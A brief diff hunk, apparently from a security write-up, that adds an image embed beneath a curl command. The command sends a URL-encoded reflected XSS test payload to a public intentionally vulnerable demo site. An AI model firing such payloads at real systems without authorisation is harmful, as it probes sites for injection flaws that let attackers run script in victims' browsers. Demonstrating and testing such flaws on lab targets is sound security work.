@@ -68,6 +68,9 @@ Command line (curl):
 curl -v "http://testasp.vulnweb.com/Search.asp?Search=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
 
 
+![Image](https://github.com/user-attachments/assets/f2ebbfa1-fcc6-41a3-846a-336c52bd2330)
+
+
 
 
 
